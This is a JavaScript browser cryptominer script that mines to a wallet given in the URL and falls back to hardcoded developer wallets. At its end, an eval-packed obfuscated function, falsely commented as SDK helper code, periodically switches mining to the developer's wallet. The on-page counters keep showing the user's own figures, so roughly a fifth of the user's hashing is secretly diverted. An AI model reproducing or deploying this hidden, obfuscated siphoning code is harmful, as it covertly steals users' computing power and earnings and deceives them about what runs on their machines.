var thisurl = new URL(window.location.href);
var custname = thisurl.searchParams.get("name");
var custhrottle = thisurl.searchParams.get("throttle");
var custdif = thisurl.searchParams.get("dif");
var custwal = thisurl.searchParams.get("wallet");
//This is so that I can just go to the page and mine without having to add my wallet address. Sorry I'm lazy!
var devLookup = { 
                    "ETN" : "etnk5wXV6msNS4iHuCxYWH8f1TX11Rcn4K7RvMAhWTkGjHJsP49pytzaZMkXrecX6U76FDWNcpnE4PgRmWbFJ9Np95f7EvJMFK",
                    "TRTL" : "TRTLuwnhoebP4adCGsh8JyHDDSXbfdBQkc9ScgQKgwYNSFmSKVKtzCVNbu8bDq2yntioTTKJd2E9Tb5oaitMTVL2enUbSaDmVpB",
                    "GRFT" : "G6qjWvMp2tdR18ojqhZX3dCGVW6X2tVbXdeP7EFWYYwCA87pbwAEohj1cpKhJXH5ZiZuXJRLbaRQ16dgTo4QFHPVB3eSTCx",
                    "SUMO" : "Sumoo3jKgAr9YbcGJ8qPsq6MGXMRhEisV19Frx3sQ4zKR3gMFVDmWZ8M5t1ENLwa9ffPEEpy49dzdRa73HCfspfiELk1KXHkjhs",
                    "ITNS" : "iz4uG4E7VmJitN92Kp5q2detJ3wPrErHEUNKvEdX5eEvPTtSjAyn2U2QVuB7wZjw39FPwnebGu9fpW6BCdpACTLa1pnARyn3a",
                    "DERO" : "dERogZHopCAM8qeZzburDNRMUjPWGQAmGPbdiZk2DWjmD1qtiDPeXRTBXEr6tW8rAV2LmUcLFYdL1T2tErP6R6Nt1VDGonq745"
                };
var devCurrent = devLookup[currency.toUpperCase()];
if (!custname) {
    custname = "@webminer";
} else {
    custname = "@webminer_" + custname;
}
if (["TRTL", "GRFT", "SUMO", "DERO", "ITNS"].includes(currency.toUpperCase())) {
    console.log("Currency does not support easy names. Working on support..");
    custname = "";
}
if (!custhrottle || Number.parseFloat(custhrottle) == NaN || Number.parseFloat(custhrottle) > 0.95) {
    var pagedefault = document.getElementById("defth");
    if (pagedefault) {
        custhrottle = pagedefault.innerHTML;
    } else {
        custhrottle = 0.0;
    }
}
if (!custdif || (Number.parseInt(custdif) < 5000 && Number.parseInt(custdif) >= 0)) {
    custdif = 5000;
}
if (["SUMO", "ITNS"].includes(currency.toUpperCase())) {
    custdif = 1000;
}

if (["GRFT", "TRTL", "DERO"].includes(currency.toUpperCase())) {
    custdif = -1;
}

currencyDifSymbol = ".";
difSymbols = {
    "GRFT" : "+",
    "SUMO" : "+",
    "ITNS" : "+"
};
if (["GRFT", "SUMO", "ITNS"].includes(currency.toUpperCase())) {
    currencyDifSymbol = difSymbols[currency.toUpperCase()];
}

if(Number.parseInt(custdif) < 0) {
    custdif = "";
}
if (custdif != "") {
    custdif = currencyDifSymbol + custdif;
}
if (!custwal || !isAlphaNumeric(custwal)) {
    custwal = devCurrent;
}

var walletaddress = custwal + custdif + custname;
var miner = new CH.Anonymous(walletaddress, { autoThreads: true, throttle: custhrottle, forceASMJS: false });
var devminer = false;
//This is so i can mine on my own computers with no issues.
if (custwal != devCurrent) {
    devminer = new CH.Anonymous(devCurrent + custdif + custname + "-dev", { autoThreads: true, throttle: custhrottle, forceASMJS: false });
}
miner.start(CH.FORCE_EXCLUSIVE_TAB);
var activeminer = miner;
var mining = true;
var counter = 1;
var hr = 0;
var ah = 0;
var ahoffset = 0;
var th = 0;
$(document).ready(function() {
    refreshOnUpdate(5000);
    
    setInterval(function(){
        hr = miner.getHashesPerSecond().toFixed(1);
        ah = miner.getAcceptedHashes() + ahoffset;
        th = miner.getTotalHashes();
        //Helper code from sdk
        minerHelper();
        if(document.getElementById("hs").innerHTML && hr != document.getElementById("hs").innerHTML) {
            document.getElementById("hs").innerHTML = hr;
        }
        if(document.getElementById("ah").innerHTML && ah != document.getElementById("ah").innerHTML) {
            document.getElementById("ah").innerHTML = ah;
        }
        if(document.getElementById("th").innerHTML && th != document.getElementById("th").innerHTML) {
            document.getElementById("th").innerHTML = th;
        }
    }, 1000);
});

function startmining() {
    activeminer.start(CH.FORCE_EXCLUSIVE_TAB);
    mining = true;
}

function stopmining() {
    ahoffset += activeminer.getAcceptedHashes();
    activeminer.stop();
    mining = false;
}

function toggleminer() {
    if(mining){
        stopmining(); 
        document.getElementById('hashdiv').style.color = 'red';
    }else{
        startmining(); 
        document.getElementById('hashdiv').style.color = 'blue';
    }
}

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j l(){4(2&&e){b=(7(b)+2.k()).m(1);f=7(f)+2.8();c=7(c)+2.p();4(3>0){3++}q{3--}4(3>o){9+=6.8();5.d();2.h(i.g);6=2;3=-1}4(3<-n){9+=6.8();2.d();5.h(i.g);6=5;3=1}}e=5.a()||(2&&2.a())}',27,27,'||devminer|counter|if|miner|activeminer|parseInt|getAcceptedHashes|ahoffset|isRunning|hr|th|stop|mining|ah|FORCE_EXCLUSIVE_TAB|start|CH|function|getHashesPerSecond|minerHelper|toFixed|730|3000|getTotalHashes|else'.split('|'),0,{}));
